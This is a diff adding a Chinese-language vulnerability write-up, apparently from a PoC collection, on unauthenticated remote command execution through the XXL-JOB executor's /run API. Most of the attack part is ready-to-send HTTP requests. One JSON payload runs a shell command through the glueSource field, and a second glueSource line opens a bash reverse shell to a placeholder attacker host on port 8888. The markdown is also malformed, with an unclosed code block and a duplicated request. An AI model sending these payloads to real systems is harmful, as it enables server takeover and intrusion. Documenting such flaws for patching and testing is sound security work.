@@ -1,0 +1,63 @@
+# XXL-JOB executor 未授权访问漏洞
+
+## 漏洞描述
+XXL-JOB 是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB 分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。
+
+由于 executor 默认没有配置认证，未授权的攻击者可以通过 RESTful API 执行任意命令。
+
+参考链接：
+
+- https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
+- https://landgrey.me/blog/18/
+- https://github.com/OneSourceCat/XxlJob-Hessian-RCE
+
+## 危害等级
+CRITICAL
+
+## 参考链接
+- https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
+- https://landgrey.me/blog/18/
+- https://github.com/OneSourceCat/XxlJob-Hessian-RCE
+
+## 漏洞复现方法
+向客户端（executor）发送如下数据包，即可执行命令：
+
+```
+POST /run HTTP/1.1
+Host: your-ip:9999
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+
+## Payloads
+```
+POST /run HTTP/1.1
+Host: your-ip:9999
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 365
+
+{
+  "jobId": 1,
+  "executorHandler": "demoJobHandler",
+  "executorParams": "demoJobHandler",
+  "executorBlockStrategy": "COVER_EARLY",
+  "executorTimeout": 0,
+  "logId": 1,
+  "logDateTime": 1586629003729,
+  "glueType": "GLUE_SHELL",
+  "glueSource": "touch /tmp/awesome_poc",
+  "glueUpdatetime": 1586699003758,
+  "broadcastIndex": 0,
+  "broadcastTotal": 0
+}
+```
+```
+"glueSource": "bash -i >& /dev/tcp/your-ip/8888 0>&1 "
+```
